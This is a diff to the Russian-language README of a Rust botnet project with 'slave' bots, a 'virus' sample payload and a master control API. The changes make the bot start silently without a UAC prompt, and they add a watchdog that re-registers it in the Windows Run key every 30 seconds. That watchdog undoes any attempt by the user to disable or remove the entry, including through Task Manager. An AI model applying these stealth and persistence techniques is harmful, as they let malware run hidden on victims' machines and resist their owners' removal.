@@ -1,14 +1,14 @@
 > "botnet" is already cool enough
 
 ## Build
-#### slave (специальный манифест requireAdministrator через embed-manifest в `build.rs`)
+#### slave (манифест asInvoker через embed-manifest в `build.rs` — тихий старт, без UAC)
 `cargo zigbuild --bin slave --release --target x86_64-pc-windows-gnu`
 #### virus(sample payload)
 `cargo zigbuild --bin virus --release --target x86_64-pc-windows-gnu`
 #### cook iso for VM 
 `xorriso -outdev output.iso -blank as_needed -map target/x86_64-pc-windows-gnu/release/virus.exe /virus.exe`
 
-> оба бина для windows получают встроенный манифест с `requireAdministrator` (см. `build.rs`) — при запуске exe Windows сам запросит повышение прав
+> оба бина для windows получают встроенный манифест с `asInvoker` (см. `build.rs`) — бот стартует молча, без UAC-диалога
 
 ## Master API (port 6767)
 
@@ -110,3 +110,13 @@ curl -s http://localhost:6767/pro
 4. **только после исполнения** идёт в `GET /pro` и ищет себя по своему IP; если мастера так и не записал `ip -> id` — перепосылаем `accepted` и проверяем ещё раз
 
 Всё под `tokio::spawn` — не тормозим следующий poll.
+
+### Автозапуск (страж)
+
+Slave каждые 30 сек **слепо перерегистрирует себя** в автозапуске крейтом `auto-launch` (`disable()` + `enable()` с свежим `current_exe()`), `autostart_watchdog` в `src/slave.rs`, первый чек — сразу при старте:
+
+- Windows: ключ `HKCU\Software\...\Run` (`WindowsEnableMode::CurrentUser` — без админа, в духе asInvoker) + разруливание гашения через Task Manager (`StartupApproved`)
+- Linux: `~/.config/autostart/*.desktop` (для тестов; slave целится в Windows)
+- имя записи — `diddy slave`
+
+Слепая перерегистрация гарантирует свежий путь в записи после переезда exe, убранные вручную/Task Manager'ом записи возвращаются через ≤30 сек.
